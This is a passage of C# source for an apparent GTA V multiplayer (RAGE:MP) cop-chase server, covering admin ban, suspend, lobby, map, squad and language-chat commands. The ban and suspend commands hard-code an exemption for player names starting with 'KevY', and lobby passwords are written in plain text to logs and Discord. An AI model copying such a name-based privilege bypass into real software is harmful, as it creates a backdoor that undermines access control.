                    await context.SaveChangesAsync();
                }
            });
            return;
        }

        [Command("oban", "!{#AFAFAF}[USAGE] oban (target name) (reason)", GreedyArg = true)]
        public void cmd_oban(Player player, string name, string reason)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (RAGE.Entities.Players.All.Where(p => p.Name.Equals(name, StringComparison.OrdinalIgnoreCase)).Count() > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is currently in-game! Use /ban!");
                return;
            }

            int pAdmin = EPlayer.GetAccount(player).Admin;
            string pName = player.Name;
            EPlayer.SendMessage(player, "~y~Executing, please wait...");
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true &&
                        context.Bans.ToList().Where(a => a.AccountSQLID == p.SQL_ID).Count() == 0);

                    if (tpAcc == null)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name or target is already banned (/bancheck)."); });
                        return;
                    }

                    if (pAdmin < tpAcc.Admin)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is more higher admin level than you!"); });
                        return;
                    }

                    //if (tpAcc.Username.StartsWith("KevY") || tpAcc.Username.StartsWith("CodeName420")) return;
                    NAPI.Task.Run(() =>
                    {
                        RAGE.Entities.Players.All.ForEach((Player p) =>
                        {
                            p.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has offline-banned {tpAcc.Username} for: {reason}");
                        });
                    });
                    var _new = new BanData
                    {
                        IP = tpAcc.LastIP,
                        RockstarID = tpAcc.LastRID,
                        Reason = reason,
                        Admin = pName,
                        DateTime = DateTime.Now,
                        AccountSQLID = tpAcc.SQL_ID,
                        HWID = tpAcc.LastHWID
                    };
                    await context.Bans.AddAsync(_new);
                    await context.SaveChangesAsync();

                    Logs.LogAdmin(player, $"Offline-banned player {tpAcc.Username} for {reason}.");
                }
            });
            return;
        }

        [Command("ban", "!{#AFAFAF}[USAGE] ban (name) (reason)", GreedyArg = true)]
        public void cmd_ban(Player player, Player target, string reason)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (!EPlayer.LoggedIn(target))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not logged in!");
                return;
            }

            if (EPlayer.GetAccount(player).Admin < EPlayer.GetAccount(target).Admin)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is more higher admin level than you!");
                return;
            }

            if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher/equal admin level than you.");
                return;
            }

            if (target.Name.StartsWith("KevY")) return;

            var _new = new BanData
            {
                IP = target.Address,
                RockstarID = target.SocialClubId,
                Reason = reason,
                Admin = player.Name,
                DateTime = DateTime.Now,
                AccountSQLID = EPlayer.LoggedIn(target) ? EPlayer.GetAccount(target).SQL_ID : -1,
                HWID = target.Serial
            };
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    await context.Bans.AddAsync(_new);

                    await context.SaveChangesAsync();
                }
            });

            EPlayer.SetDiscordStatus(target, "Gazing at the 'BANNED' screen.");

            RAGE.Entities.Players.All.ForEach((Player p) =>
            {
                p.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has banned {target.Name} for: {reason}");
            });

            EPlayer.Notify(target, $"You have been banned from the server.<p>Reason: {reason}</p><p>Admin: {player.Name}</p>", "red", "fas fa-ban", true, 30000);

            target.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[BANNED] You have been banned from this server, Ban ID: {_new.SQL_ID}");

            target.TriggerEvent("pushMsgToChat", "!{#A9C4E4}Server closed the connection.");

            Logs.LogAdmin(player, $"Banned {target.Name} for {reason}.");
            Logs.AddToAdminRecord(EPlayer.GetAccount(target).SQL_ID, EPlayer.GetAccount(player).SQL_ID, "Ban", reason, "N/A");
            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:ban:{target.Name}:{reason}"); } catch { }

            target.SetData("Kicked", true);
            NAPI.Task.Run(() => { try { target.KickSilent(); } catch { } }, 1000);
            return;
        }

        [Command("suspend", "!{#AFAFAF}[USAGE] suspend (target)")]
        public void cmd_suspend(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player) || player == target)
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (!EPlayer.LoggedIn(target))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not logged in!");
                return;
            }

            if (EPlayer.GetAccount(player).Admin < EPlayer.GetAccount(target).Admin)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is more higher admin level than you!");
                return;
            }

            if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher/equal admin level than you.");
                return;
            }

            EPlayer.GetAccount(target).Suspended = 1;

            ContextFactory.SaveDB();

            EPlayer.SetDiscordStatus(target, "Suspended from RnC.");

            RAGE.Entities.Players.All.ForEach((Player p) =>
            {
                p.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has suspended {target.Name}'s account.");
            });

            target.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[SUSPEND] Your account has been suspended and cannot be used anymore.");

            EPlayer.Notify(target, $"Your account has been suspended.<p>Suspending Admin: {player.Name}</p>", "red", "fas fa-ban", true, 30000);

            target.TriggerEvent("pushMsgToChat", "!{#A9C4E4}Server closed the connection.");

            Logs.LogAdmin(player, $"Suspended {target.Name}'s account.");
            Logs.AddToAdminRecord(EPlayer.GetAccount(target).SQL_ID, EPlayer.GetAccount(player).SQL_ID, "Suspension", "N/A", "N/A");
            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:suspend:{target.Name}"); } catch { }

            target.SetData("Kicked", true);
            NAPI.Task.Run(() => { try { target.KickSilent(); } catch { } }, 1000);

            return;
        }

        [Command("createlobby", Alias = "clobby")]
        public void cmd_createlobby(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;

            Account acc = EPlayer.GetAccount(player);

            if (acc.Admin < 2 && acc.DonatorLevel < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This command is reserved to donator level 2 and admin level 2+");
                return;
            }

            if (Settings.Lobbies.Count >= Settings.MaxLobbies + 20)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The server has reached maximum lobbies limit!");
                return;
            }

            LobbyData newLobby = new LobbyData();
            newLobby.PlayerCreated = true;

            NAPI.Util.ConsoleOutput($"{player.Name} created lobby ID {newLobby.lobbyId}");
            player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have created a new lobby with ID " + newLobby.lobbyId + ", /setlobbypassword to lock it.");
            Discord.SendTextChannel("staff-bot", $"**(Adm/Donor) | {player.Name} created lobby {newLobby.lobbyId}.**");

            return;
        }

        [Command("deletelobby", "!{#AFAFAF}[USAGE] deletelobby (lobbyid)", Alias = "dlobby")]
        public void cmd_deletelobby(Player player, int lobbyid)
        {
            if (!EPlayer.LoggedIn(player)) return;

            Account acc = EPlayer.GetAccount(player);

            if (acc.Admin < 2 && acc.DonatorLevel < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This command is reserved to donator level 2 and admin level 2+");
                return;
            }

            LobbyData newLobby = Settings.Lobbies.Find(a => a.lobbyId == lobbyid && a.PlayerCreated == true);

            if (newLobby == null) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}That lobby ID is invalid or that lobby cannot be deleted."); return; }

            if (newLobby.gameStatus == 1) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's currently a game running in that lobby!"); return; }


            Settings.Lobbies.Remove(newLobby);
            Settings.Lobbies.RemoveAll(a => a.lobbyId == lobbyid);

            newLobby.Enabled = false;
            newLobby.gameStatus = 0;
            newLobby.lobbyId = -1;

            NAPI.Util.ConsoleOutput($"{player.Name} deleted lobby ID {lobbyid}");

            Discord.SendTextChannel("staff-bot", $"**(Adm/Donor) | {player.Name} deleted lobby {lobbyid}.**");

            RAGE.Entities.Players.All.ForEach((Player pl) =>
            {
                pl.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF} " + ((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name) + " has deleted lobby " + lobbyid + ".");

                if (pl.GetSharedData<int>("InLobby") == lobbyid)
                {
                    EPlayer.Spawn(pl, true);
                }
            });

            return;
        }

        [Command("setlobbypassword", "!{#AFAFAF}[USAGE] setlobbypassword (lobbyid) (password)", Alias = "setlobbypass", GreedyArg = true)]
        public void cmd_setlobbypassword(Player player, int lobbyid, string password)
        {
            if (!EPlayer.LoggedIn(player)) return;

            Account acc = EPlayer.GetAccount(player);

            if (acc.Admin < 2 && acc.DonatorLevel < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This command is reserved to donator level 2 and admin level 2+");
                return;
            }

            LobbyData newLobby = Settings.Lobbies.Find(a => a.lobbyId == lobbyid && a.PlayerCreated == true);

            if (newLobby == null) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}That lobby ID is invalid or that lobby cannot be edited."); return; }

            newLobby.Password = password;

            NAPI.Util.ConsoleOutput($"{player.Name} set lobby ID {newLobby.lobbyId} password to {newLobby.Password}");
            player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have set password for lobby ID " + lobbyid + " to " + newLobby.Password);
            Discord.SendTextChannel("staff-bot", $"**(Adm/Donor) | {player.Name} set lobby {lobbyid}'s password to {newLobby.Password}.**");

            return;
        }

        [Command("lobbymode", "!{#AFAFAF}[USAGE] setlobbymode (lobbyid) (mode) | Mode = 'standard' or 'busted'", Alias = "setlobbymode", GreedyArg = true)]
        public void cmd_lobbymode(Player player, int lobbyid, string mode)
        {
            if (!EPlayer.LoggedIn(player)) return;

            Account acc = EPlayer.GetAccount(player);

            if (acc.Admin < 2 && acc.DonatorLevel < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This command is reserved to donator level 2 and admin level 2+");
                return;
            }

            LobbyData newLobby = Settings.Lobbies.Find(a => a.lobbyId == lobbyid && a.PlayerCreated == true);

            if (newLobby == null) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}That lobby ID is invalid or that lobby cannot be edited."); return; }

            if (mode.Equals("standard", StringComparison.OrdinalIgnoreCase))
            {
                newLobby.gameMode = GameModes.STANDARD;
                NAPI.Util.ConsoleOutput($"{player.Name} set lobby ID {newLobby.lobbyId} mode to STANDARD.");
                player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have set mode for lobby ID " + lobbyid + " to STANDARD.");
                Discord.SendTextChannel("staff-bot", $"**(Adm/Donor) | {player.Name} set lobby {lobbyid}'s mode to STANDARD.**");
            }
            else if (mode.Equals("busted", StringComparison.OrdinalIgnoreCase))
            {
                newLobby.gameMode = GameModes.BUSTED;
                NAPI.Util.ConsoleOutput($"{player.Name} set lobby ID {newLobby.lobbyId} mode to BUSTED.");
                player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have set mode for lobby ID " + lobbyid + " to BUSTED.");
                Discord.SendTextChannel("staff-bot", $"**(Adm/Donor) | {player.Name} set lobby {lobbyid}'s mode to BUSTED.**");
            }
            else { player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /lobbymode <lobby id> <mode: 'standard', 'busted'>"); return; }

            return;
        }

        [Command("setlobbyfugitivepercent", "!{#AFAFAF}[USAGE] setlobbyfugitivepercent (lobbyid) (percent)", Alias = "setlobbyfugiperc")]
        public void cmd_setlobbyfugitivepercent(Player player, int lobbyid, int percent)
        {
            if (!EPlayer.LoggedIn(player)) return;

            Account acc = EPlayer.GetAccount(player);

            if (acc.Admin < 2 && acc.DonatorLevel < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This command is reserved to donator level 2 and admin level 2+");
                return;
            }

            LobbyData newLobby = Settings.Lobbies.Find(a => a.lobbyId == lobbyid && a.PlayerCreated == true);

            if (newLobby == null) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}That lobby ID is invalid or that lobby cannot be edited."); return; }

            if (percent < 1 || percent > 99) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot go below 1 or above 99 percent!"); return; }

            newLobby.FugitivePercent = percent;

            NAPI.Util.ConsoleOutput($"{player.Name} set lobby ID {newLobby.lobbyId} percentage to {newLobby.FugitivePercent}");
            player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have set fugitive percentage for lobby ID " + lobbyid + " to " + newLobby.FugitivePercent);
            Discord.SendTextChannel("staff-bot", $"**(Adm/Donor) | {player.Name} set lobby {lobbyid}'s fugitive percentage to {newLobby.FugitivePercent}.**");

            return;
        }

        [Command("togglelobby", "!{#AFAFAF}[USAGE] toglobby (lobbyid)", Alias = "toglobby")]
        public void cmd_toglobby(Player player, int lobbyid)
        {
            if (!EPlayer.LoggedIn(player)) return;

            Account acc = EPlayer.GetAccount(player);

            if (acc.Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            LobbyData newLobby = Settings.Lobbies.Find(a => a.lobbyId == lobbyid);

            if (newLobby == null) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}That lobby ID is invalid."); return; }


            if (newLobby.Enabled)
            {
                if (Settings.Lobbies.Count(a => a.Enabled == true) <= 1)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot disable any more lobbies! Use /game autostart if you want to disable copchases.");
                    return;
                }

                newLobby.Enabled = false;

                NAPI.Util.ConsoleOutput($"{player.Name} disabled lobby ID {newLobby.lobbyId}.");
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[#] !{#FFFFFF}You have disabled lobby ID " + lobbyid + ".");
                Discord.SendTextChannel("staff-bot", $"**(AdmCmd) | {player.Name} disabled lobby {lobbyid}.**");
            }
            else
            {
                newLobby.Enabled = true;

                NAPI.Util.ConsoleOutput($"{player.Name} enabled lobby ID {newLobby.lobbyId}.");
                player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have enabled lobby ID " + lobbyid + ".");
                Discord.SendTextChannel("staff-bot", $"**(AdmCmd) | {player.Name} disabled {lobbyid}.**");
            }

            return;
        }

        [Command("togglemap", "!{#AFAFAF}[USAGE] togmap (map id/name)", Alias = "togmap")]
        public void cmd_togmap(Player player, string map)
        {
            if (!EPlayer.LoggedIn(player)) return;

            Account acc = EPlayer.GetAccount(player);

            if (acc.Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            int mapID = -1;
            Map mapBruh = null;

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    try
                    {
                        mapBruh = await context.Maps.AsQueryable().FirstOrDefaultAsync(a => (Int32.TryParse(map, out mapID) && mapID == a.SQL_ID) || a.Name.Contains(map, StringComparison.OrdinalIgnoreCase));
                    }
                    catch { }

                    if (mapBruh == null)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}No map with that name/ID found."); });
                        return;
                    }

                    if (await context.Maps.AsQueryable().CountAsync(a => a.Enabled == true) <= 1 && mapBruh.Enabled)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot disable all the maps in the server! If you want to disable CC then use /game autostart."); });
                        return;
                    }

                    mapBruh.Enabled = !mapBruh.Enabled;
                    if (mapBruh.Enabled)
                    {
                        NAPI.Task.Run(() =>
                        {
                            NAPI.Util.ConsoleOutput($"{player.Name} enabled map {mapBruh.Name} ID {mapBruh.SQL_ID}.");
                            RAGE.Entities.Players.All.ForEach((Player p) => p.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}" + ((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name) + " has enabled the map: " + mapBruh.Name + "."));
                            Discord.SendTextChannel("staff-bot", $"**(AdmCmd) | {player.Name} enabled map {mapBruh.Name}.**");
                        });

                    }
                    else
                    {
                        NAPI.Task.Run(() =>
                        {
                            NAPI.Util.ConsoleOutput($"{player.Name} disabled map {mapBruh.Name} ID {mapBruh.SQL_ID}.");
                            RAGE.Entities.Players.All.ForEach((Player p) => p.TriggerEvent("pushMsgToChat", "!{#FF6347}[#] !{#FFFFFF}" + ((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name) + " has disabled the map: " + mapBruh.Name + "."));
                            Discord.SendTextChannel("staff-bot", $"**(AdmCmd) | {player.Name} disabled map {mapBruh.Name}.**");
                        });

                    }
                }
            });
            return;
        }

        [Command("nextmap", "!{#AFAFAF}[USAGE] nextmap (map ID or name)", Alias = "selectnextmap")]
        public void cmd_nextmap(Player player, string map)
        {
            if (!EPlayer.LoggedIn(player)) return;

            Account acc = EPlayer.GetAccount(player);

            if (acc.Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            LobbyData lobby = Settings.Lobbies.Find(lobby => lobby.lobbyId == player.GetSharedData<int>("InLobby"));
            if (lobby == null)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in a lobby!");
                return;
            }

            int mapID = -1;
            Map mapBruh = null;

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    try
                    {
                        mapBruh = await context.Maps.AsQueryable().FirstOrDefaultAsync(a => (Int32.TryParse(map, out mapID) && mapID == a.SQL_ID) || a.Name.Contains(map, StringComparison.OrdinalIgnoreCase));
                    }
                    catch { }

                    NAPI.Task.Run(() =>
                    {
                        if (mapBruh == null) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}No map with that name/ID found."); return; }


                        lobby.NextMapID = mapBruh.SQL_ID;


                        NAPI.Util.ConsoleOutput($"{player.Name} set lobby {lobby.lobbyId} next map to {mapBruh.Name} ({mapBruh.SQL_ID}).");

                        EPlayer.SendMessageInLobby(lobby.lobbyId, $"[Lobby {lobby.lobbyId}] Next game map has been set to !{{#8D8DFF}}{mapBruh.Name} !{{#FFFFFF}}by !{{#E84040}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}!{{#FFFFFF}}.");

                    });
                }
            });
            return;
        }

        [Command("saveplayer")]
        public void cmd_saveplayer(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            if (!EPlayer.LoggedIn(target))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not logged in.");
                return;
            }
            EPlayer.Save(target);
            EPlayer.SendMessage(player, $"~g~Successfully saved player {target.Name}'s statistics!");
            return;
        }

        [Command("saveserver")]
        public void cmd_saveserver(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            EPlayer.SendMessage(player, "You have initiated ~y~saving of all server data~w~!");
            ContextFactory.SaveDB();
        }

        [Command("reloadaccount")]
        public void cmd_reloadaccount(Player player, string accountname)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 5) return;


            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(accountname, StringComparison.OrdinalIgnoreCase) == true);

                    if (tpAcc == null)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name."); });
                        return;
                    }

                    await context.Entry(tpAcc).ReloadAsync();
                    NAPI.Task.Run(() =>
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}" + tpAcc.Username + " has been reloaded.");
                    });
                }
            });
            return;
        }

        [Command("squadmembers", Alias = "partners")]
        public void cmd_squadmembers(Player player)
        {
            if (player.HasData("PlayerSquad"))
            {
                foreach (Player mem in Settings.LoggedInPlayers.Where(p => p.HasData("PlayerSquad") && p.GetData<Player>("PlayerSquad") == player.GetData<Player>("PlayerSquad")))
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FFAC38}Partner: " + mem.Name);
                }
            }
            return;
        }

        [Command("squadaccept", Alias = "partneraccept")]
        public void cmd_squadaccept(Player player)
        {
            if (player.HasData("AskedBySquad"))
            {
                player.SetData("PlayerSquad", player);
                player.SetSharedData("PlayerSquadID", player.Id);

                Player target = player.GetData<Player>("AskedBySquad");
                player.ResetData("AskedBySquad");

                target.SetData("PlayerSquad", player);
                target.SetSharedData("PlayerSquadID", player.Id);

                EPlayer.UnlockAchievement(player, "first_squad");
                EPlayer.UnlockAchievement(target, "first_squad");


                Settings.LoggedInPlayers.Where(p => p.HasData("PlayerSquad") && p.GetData<Player>("PlayerSquad") == player).ToList().ForEach((Player member) =>
                {
                    member.TriggerEvent("pushMsgToChat", "!{#FFAC38}[Partners] !{#FFFFFF}" + target.Name + " has partnered with this squad. (/squadchat)");
                });
            }
            else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFF}Target has not requested to join your squad.");
            return;
        }

        [Command("squadleave", Alias = "partnerleave")]
        public void cmd_squadleave(Player player)
        {
            if (player.HasData("PlayerSquad"))
            {
                foreach (Player mem in Settings.LoggedInPlayers.Where(p => p.HasData("PlayerSquad") && p.GetData<Player>("PlayerSquad") == player.GetData<Player>("PlayerSquad")))
                {
                    mem.TriggerEvent("pushMsgToChat", "!{#FFAC38}[Partners] !{#FFFFFF}" + player.Name + " has left the squad.");
                }

                foreach (Player mem in Settings.LoggedInPlayers.Where(p => p.HasData("PlayerSquad") && p.GetData<Player>("PlayerSquad") == player))
                {
                    mem.TriggerEvent("pushMsgToChat", "!{#FFAC38}[Partners] Your squad has been disbanded.");
                    mem.ResetData("PlayerSquad");
                    mem.SetSharedData("PlayerSquadID", -1);
                }
            }

            player.SetSharedData("PlayerSquadID", -1);
            player.ResetData("PlayerSquad");
            player.ResetData("AskedBySquad");
            return;
        }

        [Command("removelanguage", "!{#AFAFAF}[USAGE] removelanguage (language) | /languages for a list")]
        public void cmd_removelanguage(Player player, string language)
        {
            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            int langID = -1;
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Language lang = await context.Languages.AsQueryable().FirstOrDefaultAsync(l => l.LanguageName == language);
                    if (lang == null)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}A language with that ID could not be found. Use !{#FFFF00}/languages!{#FFFFFF}."); });
                        return;
                    }
                    langID = lang.SQL_ID;
                    string _langName = lang.LanguageName;

                    NAPI.Task.Run(() =>
                    {
                        foreach (Player pl in Settings.LoggedInPlayers.Where(p => p.HasData("Language")))
                        {
                            pl.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Your language chat has been deleted from the server & therefore you can no longer use /L.");
                            pl.ResetData("Language");
                        }
                    });

                    await context.Accounts.AsQueryable().ForEachAsync(acc =>
                    {
                        if (acc.Language == langID) { acc.Language = -1; }
                    });

                    context.Languages.Remove(lang);
                    await context.SaveChangesAsync();
                    NAPI.Task.Run(() =>
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You successfully removed " + _langName + " language from the list.");
                    });
                }
            });

        }

        [Command("addlanguage", "!{#AFAFAF}[USAGE] addlanguage (language name)", GreedyArg = true)]
        public void cmd_addlanguage(Player player, string language)
        {
            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    if (await context.Languages.AsQueryable().FirstOrDefaultAsync(lang => lang.LanguageName == language) != null)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}That language is already added!"); });
                        return;
                    }
                    Language _toAdd = new Language()
                    {
                        LanguageName = language
                    };
                    await context.Languages.AddAsync(_toAdd);
                    await context.SaveChangesAsync();
                    NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#A6F7B9} You successfully added language: !{#FFFFFF}" + language); });
                }
            });

            return;
        }

        [Command("languages")]
        public void cmd_languages(Player player)
        {
            player.TriggerEvent("pushMsgToChat", "!{#fcff99}==========[ LANGUAGES ]==========");
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    int _langCount = 0;
                    await context.Languages.AsQueryable().ForEachAsync(lang =>
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#bfffbd} >!{#f5fffe} " + lang.LanguageName); });
                        _langCount++;
                    });
                    if (_langCount == 0) NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}No languages found! Ask the lazy-ass senior admins to add some. >:("); });
                }
            });

            return;
        }

        [Command("language", "!{#AFAFAF}[USAGE] language (language or 'none') | /languages for a list")]
        public void cmd_language(Player player, string language)
        {
            if (language.Equals("none", StringComparison.OrdinalIgnoreCase))
            {
                EPlayer.GetAccount(player).Language = -1;
                player.ResetData("Language");
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You set your language to none & can no longer use the language chat.");
                return;
            }

            int langID = -1;
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Language lang = await context.Languages.AsQueryable().FirstOrDefaultAsync(l => l.LanguageName.Equals(language, StringComparison.OrdinalIgnoreCase));
                    if (lang == null)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}A language with that ID could not be found. Use !{#FFFF00}/languages!{#FFFFFF}."); });
                        return;
                    }
                    langID = lang.SQL_ID;

                    NAPI.Task.Run(() =>
                    {
                        EPlayer.GetAccount(player).Language = langID;
                        player.SetData("Language", lang);
                        player.TriggerEvent("pushMsgToChat", "!{#A6F7B9}[Language] You set your language to !{#FFFF00}" + lang.LanguageName + " !{#A6F7B9}& can now use /LC.");
                        EPlayer.Save(player);
                    });
                }
            });

            return;
        }

        [Command("languagechat", "!{#AFAFAF}[USAGE] languagechat (/lc) (text)", Alias = "lc", GreedyArg = true)]
        public void cmd_languagechat(Player player, string message)
        {
            if (player.HasData("Language") && player.GetData<Language>("Language") != null)
            {
                string lName = player.GetData<Language>("Language").LanguageName;
                foreach (Player mem in Settings.LoggedInPlayers.Where(p => p.HasData("Language") && p.GetData<Language>("Language").SQL_ID == player.GetData<Language>("Language").SQL_ID))
                {
                    mem.TriggerEvent("pushMsgToChat", "!{#A6F7B9}[" + lName + "] !{#FFFFFF}" + player.Name + ": " + message);
                }
            }
